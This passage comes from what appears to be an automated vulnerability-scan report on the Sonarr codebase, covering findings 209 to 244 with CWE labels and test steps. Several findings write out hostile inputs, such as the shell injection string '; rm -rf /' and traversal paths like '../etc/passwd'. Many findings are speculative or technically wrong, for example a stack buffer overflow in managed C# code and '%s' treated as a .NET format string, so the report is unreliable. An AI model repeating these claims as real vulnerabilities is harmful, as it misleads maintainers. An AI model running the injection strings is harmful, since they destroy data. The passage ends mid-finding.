**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCommon_Instrumentation_Sentry_SentryTargetcs.py`
---

### 209. Command Injection (CWE-77)

**File:** src/NzbDrone.Common/Extensions/PathExtensions.cs
**Line:** 270

**Description:**
The CleanPath method uses Path.Join which may not properly sanitize inputs for command execution contexts.

**Evidence:**
```
The CleanPath method uses Path.Join with string arrays that could contain command injection sequences.
```

**Impact:**
If paths containing command injection sequences are processed through CleanPath, they could lead to command execution vulnerabilities.

**Proof of Concept:**
Pass a path containing command injection sequences to CleanPath and verify if the result could be used in command execution contexts.

**How to Test:**
Test CleanPath with inputs containing command injection sequences like "; rm -rf /" and verify if the result could be used in command contexts.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCommon_Extensions_PathExtensionscs.py`
---

### 210. Improper Access Control (CWE-284)

**File:** src/NzbDrone.Common/Instrumentation/NzbDroneLogger.cs
**Line:** 100

**Description:**
The logging configuration may not properly enforce access controls on log files, potentially allowing unauthorized access to sensitive information.

**Evidence:**
```
The RegisterAppFile method creates log files without explicit access control enforcement, and the logging system may not validate access to log directories.
```

**Impact:**
Unauthorized users might be able to read sensitive information from log files, potentially exposing credentials or configuration details.

**Proof of Concept:**
Create a scenario where log files are accessible to unauthorized users and verify if sensitive information is exposed.

**How to Test:**
Check file permissions on log files created by NzbDroneLogger and verify if unauthorized users can access sensitive information.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-284_src_NzbDroneCommon_Instrumentation_NzbDroneLoggercs.py`
---

### 211. Use of Externally-Controlled Format String (CWE-134)

**File:** src/NzbDrone.Common/Extensions/StringExtensions.cs
**Line:** 100

**Description:**
The Inject method uses string.Format with externally controlled format strings, potentially leading to format string injection vulnerabilities.

**Evidence:**
```
The Inject method uses string.Format with format parameters that could be externally controlled, allowing format string injection.
```

**Impact:**
An attacker could manipulate format strings to cause unexpected behavior or information disclosure.

**Proof of Concept:**
Pass a format string containing format specifiers to Inject method and verify if it could be exploited for information disclosure or unexpected behavior.

**How to Test:**
Test Inject method with various format strings containing format specifiers and verify if they can be manipulated for injection attacks.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-134_src_NzbDroneCommon_Extensions_StringExtensionscs.py`
---

### 212. Insufficient Verification of Data Authenticity (CWE-345)

**File:** src/NzbDrone.Common/Instrumentation/Sentry/SentryTarget.cs
**Line:** 170

**Description:**
The SentryTarget class doesn't properly verify the authenticity of incoming data before processing, potentially allowing data manipulation.

**Evidence:**
```
The SentryTarget processes log events without sufficient verification of data authenticity, particularly in the fingerprint generation and event processing.
```

**Impact:**
An attacker could manipulate sentry events to bypass filtering or inject malicious data.

**Proof of Concept:**
Create a manipulated sentry event with forged fingerprints or data and verify if it bypasses the normal filtering mechanisms.

**How to Test:**
Test SentryTarget with manipulated events and verify if the authenticity verification is sufficient to prevent data manipulation.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-345_src_NzbDroneCommon_Instrumentation_Sentry_SentryTargetcs.py`
---

### 213. Deserialization of Untrusted Data (CWE-502)

**File:** src/NzbDrone.Common/Extensions/ObjectExtensions.cs
**Line:** 10

**Description:**
The JsonClone method uses JSON deserialization which could be vulnerable to deserialization attacks if not properly configured.

**Evidence:**
```
The JsonClone method uses Json.Deserialize which could be vulnerable to deserialization attacks if the deserialization process is not properly secured.
```

**Impact:**
An attacker could craft malicious JSON data that when deserialized could lead to code execution or information disclosure.

**Proof of Concept:**
Create a malicious JSON payload that when passed to JsonClone could result in unexpected behavior or code execution.

**How to Test:**
Test JsonClone with various malicious JSON payloads and verify if it's vulnerable to deserialization attacks.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-502_src_NzbDroneCommon_Extensions_ObjectExtensionscs.py`
---

### 214. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Common/Http/HttpUri.cs
**Line:** 105

**Description:**
The HttpUri class doesn't validate input parameters during construction, particularly in the constructor that accepts individual components.

**Evidence:**
```
The HttpUri(string scheme, string host, int? port, string path, string query, string fragment) constructor accepts raw parameters without validation, and the Parse() method doesn't validate the parsed components.
```

**Impact:**
Malformed URI components could cause unexpected behavior or lead to downstream vulnerabilities when these URIs are used in file operations or HTTP requests.

**Proof of Concept:**
Passing null or malformed values to the HttpUri constructor could result in unexpected behavior or exceptions when the URI is later used in operations.

**How to Test:**
Test the HttpUri constructor with null values, empty strings, and malformed components to verify proper handling.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCommon_Http_HttpUrics.py`
---

### 215. Cross-Site Scripting (XSS) (CWE-79)

**File:** src/NzbDrone.Common/Http/HttpResponse.cs
**Line:** 120

**Description:**
The HttpResponse.ToString() method includes content in error responses without proper HTML escaping, potentially leading to XSS vulnerabilities.

**Evidence:**
```
The ToString() method includes Content in error responses when HasHttpError is true and the content type is not HTML, but doesn't escape the content before inclusion.
```

**Impact:**
If an HTTP response contains user-controllable content that is not properly escaped, it could lead to XSS when the response is displayed in a web context.

**Proof of Concept:**
When an HTTP error response contains user-controllable data in the Content property, and this content is not HTML-escaped, it could be executed as JavaScript in a web browser.

**How to Test:**
Create HTTP responses with user-controllable content and verify that the ToString() method properly escapes content in error scenarios.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_src_NzbDroneCommon_Http_HttpResponsecs.py`
---

### 216. Path Traversal (CWE-22)

**File:** src/NzbDrone.Common/Http/HttpRequestBuilder.cs
**Line:** 310

**Description:**
The HttpRequestBuilder.CombinePath method doesn't properly validate or sanitize path components, potentially allowing path traversal attacks.

**Evidence:**
```
The CombinePath method in HttpRequestBuilder doesn't validate input parameters for path traversal sequences like '../' or './'.
```

**Impact:**
An attacker could manipulate path parameters to access files outside the intended directory structure.

**Proof of Concept:**
Passing a path parameter containing '../' sequences to the Resource() method could allow access to parent directories.

**How to Test:**
Test the Resource() method with path parameters containing path traversal sequences and verify that they are properly handled.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCommon_Http_HttpRequestBuildercs.py`
---

### 217. Improper Control of Generation of Code ('Code Injection') (CWE-94)

**File:** src/NzbDrone.Common/Http/JsonRpcRequestBuilder.cs
**Line:** 100

**Description:**
The JsonRpcRequestBuilder uses reflection and dynamic object creation without proper validation, potentially allowing code injection.

**Evidence:**
```
The ConvertParameter method uses reflection to handle different parameter types, and the Apply method dynamically creates JSON RPC requests without validating parameter types.
```

**Impact:**
Maliciously crafted RPC parameters could lead to unexpected behavior or code execution in the RPC processing.

**Proof of Concept:**
Passing specially crafted objects as parameters to the JsonRpcRequestBuilder could result in unexpected behavior or code execution.

**How to Test:**
Test the JsonRpcRequestBuilder with various parameter types and verify that parameter validation is properly implemented.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-94_src_NzbDroneCommon_Http_JsonRpcRequestBuildercs.py`
---

### 218. Insecure Data Storage (CWE-312)

**File:** src/NzbDrone.Common/Http/HttpClient.cs
**Line:** 100

**Description:**
The HttpClient class stores cookies in a cache without proper encryption or access controls, potentially exposing sensitive authentication data.

**Evidence:**
```
The cookie container is cached using ICached<CookieContainer> without encryption, and cookies are stored in plain text.
```

**Impact:**
If the cache storage is compromised, stored cookies could be used to impersonate users or gain unauthorized access to services.

**Proof of Concept:**
If the cache directory is accessible to unauthorized users, stored cookies could be extracted and used for authentication.

**How to Test:**
Verify that cached cookies are properly secured and test access to the cache directory to ensure no sensitive data is exposed.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCommon_Http_HttpClientcs.py`
---

### 219. Improper Authentication (CWE-287)

**File:** src/NzbDrone.Common/Http/Dispatchers/ManagedHttpDispatcher.cs
**Line:** 100

**Description:**
The ManagedHttpDispatcher handles authentication but doesn't validate or sanitize authentication credentials before use.

**Evidence:**
```
The GetResponseAsync method handles BasicNetworkCredential and NetworkCredential but doesn't validate the credentials or check for credential injection.
```

**Impact:**
Maliciously crafted authentication credentials could be used to authenticate against services or could lead to credential leakage.

**Proof of Concept:**
Passing specially crafted credentials to HTTP requests could result in authentication bypass or credential injection.

**How to Test:**
Test HTTP requests with various credential formats and verify that authentication is properly validated.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-287_src_NzbDroneCommon_Http_Dispatchers_ManagedHttpDispatchercs.py`
---

### 220. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Common/Http/Proxy/HttpProxySettings.cs
**Line:** 40

**Description:**
The BypassListAsArray property in HttpProxySettings uses string splitting without proper validation of the resulting array.

**Evidence:**
```
The BypassListAsArray property splits BypassFilter by comma but doesn't validate the resulting array for proper bounds or content.
```

**Impact:**
Array index out of bounds errors could occur when processing proxy bypass lists, potentially leading to crashes or unexpected behavior.

**Proof of Concept:**
Passing a malformed BypassFilter string could result in array access violations or incorrect proxy behavior.

**How to Test:**
Test the BypassListAsArray property with various malformed input strings and verify proper array bounds checking.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCommon_Http_Proxy_HttpProxySettingscs.py`
---

### 221. Insufficient Verification of Data Authenticity (CWE-345)

**File:** src/NzbDrone.Common/Http/TooManyRequestsException.cs
**Line:** 15

**Description:**
The TooManyRequestsException class parses Retry-After header values without proper validation, potentially leading to incorrect time calculations.

**Evidence:**
```
The Retry-After parsing logic uses TryParse without validating the parsed values or handling edge cases properly.
```

**Impact:**
Incorrect Retry-After values could cause excessive retries or inappropriate delays in HTTP request handling.

**Proof of Concept:**
Passing malformed Retry-After header values could result in incorrect time calculations or exceptions.

**How to Test:**
Test the TooManyRequestsException constructor with various malformed Retry-After header values and verify proper parsing.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-345_src_NzbDroneCommon_Http_TooManyRequestsExceptioncs.py`
---

### 222. Use of Externally-Controlled Format String (CWE-134)

**File:** src/NzbDrone.Common/Http/HttpException.cs
**Line:** 15

**Description:**
The HttpException class uses string formatting with potentially externally-controlled values without proper validation.

**Evidence:**
```
The HttpException constructor uses string.Format with externally-provided values without validating the format strings.
```

**Impact:**
Maliciously crafted exception messages could lead to format string injection or unexpected behavior.

**Proof of Concept:**
Creating HttpException instances with specially crafted message parameters could result in unexpected formatting or injection.

**How to Test:**
Test HttpException construction with various format strings and verify that external inputs are properly validated.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-134_src_NzbDroneCommon_Http_HttpExceptioncs.py`
---

### 223. Improper Neutralization of Special Elements used in a Command (CWE-707)

**File:** src/NzbDrone.Common/Disk/DiskTransferService.cs
**Line:** 150

**Description:**
The DiskTransferService uses path operations that could be vulnerable to command injection if paths contain special characters or are used in shell commands.

**Evidence:**
```
The code uses paths in operations like MoveFolder, CopyFile, and DeleteFolder but doesn't validate or sanitize paths for shell command injection. The path validation only checks for valid path format but doesn't prevent shell metacharacters.
```

**Impact:**
If paths are used in shell commands or system calls, attackers could inject shell commands through specially crafted path names, potentially leading to arbitrary code execution.

**Proof of Concept:**
If a path containing shell metacharacters like '; rm -rf /' is used in a system call, it could execute additional commands beyond the intended file operation.

**How to Test:**
Test with paths containing shell metacharacters like ';', '|', '&', '$', ``, and '"'. Verify that paths are properly escaped or sanitized when used in shell contexts.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCommon_Disk_DiskTransferServicecs.py`
---

### 224. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Common/Disk/OsPath.cs
**Line:** 280

**Description:**
The GetFragments method returns an array that is accessed without proper bounds checking in the Contains method.

**Evidence:**
```
In the Contains method, leftFragments and rightFragments arrays are accessed using index 'i' without ensuring that 'i' is within array bounds before accessing elements. The loop condition 'i < leftFragments.Length' is checked but not the rightFragments.Length.
```

**Impact:**
Array index out of bounds access could lead to crashes or potentially exploitable memory corruption if the arrays are manipulated or if there are race conditions.

**Proof of Concept:**
If leftFragments has 3 elements and rightFragments has 2 elements, and the loop proceeds to index 2, accessing rightFragments[2] would cause an IndexOutOfRangeException.

**How to Test:**
Create test cases with different sized fragment arrays and verify that array bounds are properly checked before accessing array elements.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCommon_Disk_OsPathcs.py`
---

### 225. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Common/Disk/OsPath.cs
**Line:** 107

**Description:**
The OsPath constructor accepts paths but doesn't fully validate input paths for security issues, particularly around path traversal and special characters.

**Evidence:**
```
The constructor accepts string paths but relies on DetectPathKind and FixSlashes methods that don't perform comprehensive validation. The path validation only checks for basic format but not for potentially dangerous sequences.
```

**Impact:**
Improperly validated paths could lead to path traversal, command injection, or other security issues when paths are used in file operations.

**Proof of Concept:**
Passing a path like "C:\..\..\Windows\System32\cmd.exe" to OsPath constructor would not be properly validated for traversal sequences.

**How to Test:**
Test OsPath constructor with various inputs including paths with traversal sequences, special characters, and boundary conditions to ensure proper validation.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCommon_Disk_OsPathcs.py`
---

### 226. Cleartext Storage of Sensitive Information (CWE-312)

**File:** src/NzbDrone.Common/Disk/DiskTransferService.cs
**Line:** 100

**Description:**
The DiskTransferService logs paths and file operations but doesn't ensure sensitive path information is properly handled or sanitized in logs.

**Evidence:**
```
The code uses _logger.Debug to log paths and operations but doesn't sanitize or redact sensitive path information. The logging includes full paths which could contain sensitive information.
```

**Impact:**
Sensitive path information could be exposed in logs, potentially revealing system structure, file locations, or other sensitive data.

**Proof of Concept:**
If a path like "C:\Users\Admin\Documents\secret_config.xml" is logged, the full path including user directory names could expose sensitive information.

**How to Test:**
Check log outputs for sensitive path information and verify that paths are properly sanitized or redacted in log messages.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCommon_Disk_DiskTransferServicecs.py`
---

### 227. Improper Neutralization of Special Elements used in a Command (CWE-77)

**File:** src/NzbDrone.Common/Disk/DiskProviderBase.cs
**Line:** 380

**Description:**
The DiskProviderBase class uses path operations that could be vulnerable to command injection if paths are used in system calls.

**Evidence:**
```
The code uses paths in operations like MoveFile, CopyFile, and DeleteFile but doesn't validate or sanitize paths for shell command injection. The path validation only checks for valid path format but doesn't prevent shell metacharacters.
```

**Impact:**
If paths are used in shell commands or system calls, attackers could inject shell commands through specially crafted path names, potentially leading to arbitrary code execution.

**Proof of Concept:**
If a path containing shell metacharacters like '; rm -rf /' is used in a system call, it could execute additional commands beyond the intended file operation.

**How to Test:**
Test with paths containing shell metacharacters like ';', '|', '&', '$', ``, and '"'. Verify that paths are properly escaped or sanitized when used in shell contexts.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCommon_Disk_DiskProviderBasecs.py`
---

### 228. Stack-based Buffer Overflow (CWE-121)

**File:** src/NzbDrone.Common/Disk/DiskTransferService.cs
**Line:** 320

**Description:**
The TryCopyFileVerified method uses fixed-size buffers for file verification that could lead to buffer overflows.

**Evidence:**
```
The method uses fixed-size byte arrays (64KB) for file verification but doesn't validate that the file sizes match the buffer sizes, potentially leading to buffer overflows during file comparison operations.
```

**Impact:**
Buffer overflow in file verification could lead to crashes or potentially exploitable memory corruption.

**Proof of Concept:**
If a file larger than the buffer size is processed during verification, the comparison loop could access memory beyond the allocated buffer boundaries.

**How to Test:**
Test with files of various sizes, particularly large files, to ensure buffer boundaries are properly checked during file verification operations.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-121_src_NzbDroneCommon_Disk_DiskTransferServicecs.py`
---

### 229. Use of Externally-Controlled Format String (CWE-134)

**File:** src/NzbDrone.Common/Disk/DiskTransferService.cs
**Line:** 100

**Description:**
The DiskTransferService uses string formatting with potentially externally-controlled inputs in log messages.

**Evidence:**
```
The code uses string.Format with path inputs in log messages like _logger.Debug("{0} Directory [{1}] > [{2}]", mode, sourcePath, targetPath) where sourcePath and targetPath could be externally controlled.
```

**Impact:**
If path inputs contain format specifiers, they could lead to format string vulnerabilities, potentially allowing attackers to control log output or even execute code.

**Proof of Concept:**
If sourcePath contains format specifiers like "%s" or "%x", the log message could be manipulated to display unexpected content or trigger format string vulnerabilities.

**How to Test:**
Test with path inputs containing format specifiers and verify that they are properly escaped or sanitized before being used in string formatting operations.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-134_src_NzbDroneCommon_Disk_DiskTransferServicecs.py`
---

### 230. Improper Neutralization of Special Elements used in a Command (CWE-707)

**File:** src/NzbDrone.Common/EnsureThat/EnsureTypeExtensions.cs
**Line:** 64

**Description:**
The IsOfType method uses string interpolation with param.Type.FullName which could be vulnerable to command injection if the type name contains malicious characters, particularly when used in shell commands or system calls.

**Evidence:**
```
The exception message uses ExceptionMessages.EnsureExtensions_IsNotOfType.Inject(param.Type.FullName) which interpolates param.Type.FullName without proper sanitization.
```

**Impact:**
If this validation is used in contexts where type names are passed to shell commands or system calls, attackers could inject malicious commands through specially crafted type names.

**Proof of Concept:**
If a type name contains shell metacharacters like '; rm -rf /' and this is used in a system call, the command could be executed with elevated privileges.

**How to Test:**
1. Create a type with a malicious name containing shell metacharacters
2. Pass this type to any validation method that uses IsOfType
3. Check if the exception message is used in a context that executes shell commands

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCommon_EnsureThat_EnsureTypeExtensionscs.py`
---

### 231. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Common/EnsureThat/EnsureTypeExtensions.cs
**Line:** 64

**Description:**
The IsOfType method performs type comparison but doesn't validate the input parameter 'param' for null values, which could lead to NullReferenceException.

**Evidence:**
```
The method directly accesses param.Type without checking if param is null, and uses param.Name without null validation.
```

**Impact:**
If a null parameter is passed to IsOfType, the method will throw NullReferenceException instead of providing a meaningful validation error.

**Proof of Concept:**
Call IsOfType(null) where param is null - this will throw NullReferenceException instead of a proper validation exception.

**How to Test:**
1. Call any of the type validation methods (IsInt, IsString, etc.) with a null parameter
2. Verify that NullReferenceException is thrown instead of a proper validation exception

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCommon_EnsureThat_EnsureTypeExtensionscs.py`
---

### 232. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Core.Test/FluentTest.cs
**Line:** 100

**Description:**
The Truncate method test uses hardcoded values that could lead to array index validation issues when dealing with large strings or byte arrays.

**Evidence:**
```
The test uses a hardcoded 1000 byte limit for truncation but doesn't validate that the input string can actually be truncated to that limit without array bounds issues.
```

**Impact:**
If the string truncation logic has array bounds issues, it could lead to buffer overflows or index out of range exceptions.

**Proof of Concept:**
Pass a very large string to the Truncate method and verify that it handles the byte conversion correctly without array bounds exceptions.

**How to Test:**
1. Create a test with a very large string input
2. Call Truncate with a specific byte limit
3. Verify that no array index out of bounds exceptions occur

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCoreTest_FluentTestcs.py`
---

### 233. Insecure Data Storage (CWE-312)

**File:** src/NzbDrone.Core.Test/Configuration/ConfigServiceFixture.cs
**Line:** 100

**Description:**
The configuration service stores sensitive data like HMAC salt without proper encryption or secure storage mechanisms, potentially exposing sensitive information.

**Evidence:**
```
The test shows that HmacSalt is stored in the configuration database without encryption, and the ConfigService handles configuration values without explicit security considerations.
```

**Impact:**
If the database is compromised, sensitive configuration values including HMAC salts could be exposed, potentially leading to authentication bypass or data decryption issues.

**Proof of Concept:**
If database is compromised, retrieve the HmacSalt value from Config table - this value could be used to forge authentication tokens or decrypt sensitive data.

**How to Test:**
1. Check database contents after storing configuration values
2. Verify that sensitive values like HMAC salt are stored in plain text
3. Test database export/import scenarios for sensitive data exposure

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCoreTest_Configuration_ConfigServiceFixturecs.py`
---

### 234. Allocation of Resources Without Limits or Throttling (CWE-770)

**File:** src/NzbDrone.Core.Test/Housekeeping/Housekeepers/CleanupOrphanedBlocklistFixture.cs
**Line:** 15

**Description:**
The housekeeping tests create large numbers of test objects without resource limits, which could lead to memory exhaustion during test execution.

**Evidence:**
```
Multiple test fixtures create lists of objects using Builder.CreateListOfSize(5) or similar patterns without checking for resource consumption limits.
```

**Impact:**
In large test suites or when running many tests, these resource allocations could lead to OutOfMemoryException or performance degradation.

**Proof of Concept:**
Run a test suite that creates thousands of objects using the same patterns - observe memory usage and potential OutOfMemoryException.

**How to Test:**
1. Run tests that create large numbers of objects
2. Monitor memory usage during test execution
3. Check for OutOfMemoryException or performance degradation

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-770_src_NzbDroneCoreTest_Housekeeping_Housekeepers_CleanupOrphanedBlocklistFixturecs.py`
---

### 235. Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') (CWE-22)

**File:** src/NzbDrone.Core.Test/Housekeeping/Housekeepers/CleanupAbsolutePathMetadataFilesFixture.cs
**Line:** 20

**Description:**
The housekeeping tests validate absolute path handling but don't fully test for path traversal vulnerabilities in the actual implementation.

**Evidence:**
```
Tests check for absolute paths starting with drive letters, forward slashes, or backslashes but don't test for ../ or ../../ traversal patterns.
```

**Impact:**
If the actual implementation doesn't properly sanitize paths, attackers could potentially traverse directories to access unauthorized files.

**Proof of Concept:**
Create a metadata file with a path like '../etc/passwd' and verify that the cleanup process properly handles this traversal path.

**How to Test:**
1. Create metadata files with various traversal patterns
2. Run cleanup process
3. Verify that traversal paths are properly handled or rejected

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCoreTest_Housekeeping_Housekeepers_CleanupAbsolutePathMetadataFilesFixturecs.py`
---

### 236. Assignment to Critical Variable Without Intended Validation (CWE-123)

**File:** src/NzbDrone.Core.Test/ValidationTests/SystemFolderValidatorFixture.cs
**Line:** 25

**Description:**
The system folder validation tests don't validate that the validation logic properly handles edge cases or invalid inputs.

**Evidence:**
```
Tests check for specific folder validation scenarios but don't test edge cases like null paths, empty paths, or malformed paths.
```

**Impact:**
If validation logic has edge case issues, it could allow invalid paths to be accepted or reject valid paths.

**Proof of Concept:**
Test with null, empty, or malformed paths to see if validation logic properly handles these cases.

**How to Test:**
1. Test validation with null paths
2. Test validation with empty paths
3. Test validation with malformed paths
4. Verify that validation behaves correctly for all cases

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-123_src_NzbDroneCoreTest_ValidationTests_SystemFolderValidatorFixturecs.py`
---

### 237. Improper Neutralization of Special Elements used in a Command ('Command Injection') (CWE-707)

**File:** src/NzbDrone.Core.Test/Housekeeping/Housekeepers/DeleteBadMediaCovers.cs
**Line:** 105

**Description:**
The code uses file paths constructed from metadata file paths without proper validation or sanitization, potentially leading to command injection vulnerabilities when processing media files.

**Evidence:**
```
The code constructs file paths using metadata.RelativePath and metadata.Type without validating the input paths, which could be manipulated to execute arbitrary commands.
```

**Impact:**
An attacker could potentially inject malicious commands through specially crafted metadata file paths, leading to arbitrary code execution on the system.

**Proof of Concept:**
If metadata.RelativePath contains malicious characters like ';' or '&&', and the system processes these paths in shell commands, an attacker could execute arbitrary commands.

**How to Test:**
Test with metadata files having paths containing special shell characters like ';', '&', '|', or '&&' and verify if they are properly sanitized before file operations.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCoreTest_Housekeeping_Housekeepers_DeleteBadMediaCoverscs.py`
---

### 238. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core.Test/Housekeeping/Housekeepers/DeleteBadMediaCovers.cs
**Line:** 105

**Description:**
The code does not validate the metadata file paths before using them in file operations, potentially allowing invalid or malicious paths to be processed.

**Evidence:**
```
The code directly uses metadata.RelativePath in file operations without validating its contents or ensuring it's within expected boundaries.
```

**Impact:**
Invalid paths could cause unexpected behavior, file access issues, or potentially lead to path traversal vulnerabilities.

**Proof of Concept:**
Create a metadata file with RelativePath containing '../' sequences or absolute paths that could traverse outside the intended directory structure.

**How to Test:**
Test with metadata files having RelativePath values like '../../etc/passwd' or absolute paths and verify path validation logic.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCoreTest_Housekeeping_Housekeepers_DeleteBadMediaCoverscs.py`
---

### 239. Path Traversal (CWE-22)

**File:** src/NzbDrone.Core.Test/Housekeeping/Housekeepers/DeleteBadMediaCovers.cs
**Line:** 105

**Description:**
The code is vulnerable to path traversal attacks when processing metadata files with RelativePath values that contain directory traversal sequences.

**Evidence:**
```
The code constructs file paths using metadata.RelativePath without proper sanitization or validation of path components.
```

**Impact:**
An attacker could potentially access files outside the intended directory by manipulating metadata file paths.

**Proof of Concept:**
Set metadata.RelativePath to '../config.xml' or '/etc/passwd' and verify if the system processes these paths without proper validation.

**How to Test:**
Test with metadata files having RelativePath values containing '../', '..', or absolute paths and verify if they can access files outside the expected directory.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCoreTest_Housekeeping_Housekeepers_DeleteBadMediaCoverscs.py`
---

### 240. Improper Neutralization of Special Elements used in a Command ('Command Injection') (CWE-77)

**File:** src/NzbDrone.Core.Test/Housekeeping/Housekeepers/DeleteBadMediaCovers.cs
**Line:** 105

**Description:**
The code uses file paths in operations that could be vulnerable to command injection if paths are used in shell commands.

**Evidence:**
```
The code constructs file paths from metadata but doesn't validate or sanitize them for use in shell commands, potentially allowing command injection.
```

**Impact:**
If file paths are used in shell commands, an attacker could inject malicious commands through specially crafted metadata paths.

**Proof of Concept:**
Create metadata files with RelativePath values containing shell metacharacters that could be executed in shell contexts.

**How to Test:**
Test with metadata files having paths containing shell metacharacters and verify if they are properly sanitized before shell operations.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCoreTest_Housekeeping_Housekeepers_DeleteBadMediaCoverscs.py`
---

### 241. Cleartext Storage of Sensitive Information (CWE-312)

**File:** src/NzbDrone.Core.Test/NotificationTests/ProwlProviderTest.cs
**Line:** 12

**Description:**
The API key is hardcoded in the test file, which could expose sensitive information in the source code repository.

**Evidence:**
```
The Prowl API key is hardcoded as a constant string in the test file, making it visible in source control.
```

**Impact:**
If the source code repository is public or compromised, the hardcoded API key could be used by unauthorized parties.

**Proof of Concept:**
Check the source code repository for the presence of the hardcoded API key and verify if it's accessible to unauthorized users.

**How to Test:**
Search the repository for hardcoded API keys, secrets, or credentials and verify they are not part of the source control.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCoreTest_NotificationTests_ProwlProviderTestcs.py`
---

### 242. Cleartext Storage of Sensitive Information (CWE-312)

**File:** src/NzbDrone.Core.Test/NotificationTests/ProwlProviderTest.cs
**Line:** 13

**Description:**
The bad API key is also hardcoded in the test file, potentially exposing sensitive information.

**Evidence:**
```
The Prowl bad API key is also hardcoded as a constant string in the test file.
```

**Impact:**
The hardcoded bad API key could be used by unauthorized parties to test or validate API key functionality.

**Proof of Concept:**
Check if the bad API key is accessible in the source code repository and verify its usage in tests.

**How to Test:**
Verify that sensitive information like API keys, passwords, or tokens are not hardcoded in test files and are properly managed.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCoreTest_NotificationTests_ProwlProviderTestcs.py`
---

### 243. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core.Test/NotificationTests/EmailTests/EmailSettingsValidatorFixture.cs
**Line:** 55

**Description:**
The email validation logic doesn't properly validate email addresses, potentially allowing invalid email formats to pass validation.

**Evidence:**
```
The validation tests show that email addresses like 'sonarr' or 'email.me' are considered invalid, but the validation logic might not be comprehensive enough.
```

**Impact:**
Invalid email addresses could be accepted, leading to delivery failures or misconfigured email notifications.

**Proof of Concept:**
Test with email addresses like 'user@domain.com' and 'user@domain' to verify if they pass validation correctly.

**How to Test:**
Test various email formats including valid and invalid addresses to ensure proper validation logic is implemented.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCoreTest_NotificationTests_EmailTests_EmailSettingsValidatorFixturecs.py`
---

### 244. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core.Test/NotificationTests/EmailTests/EmailSettingsValidatorFixture.cs
**Line:** 65

**Description:**
The email validation logic doesn't properly validate email addresses in CC field, potentially allowing invalid email formats.

**Evidence:**
```
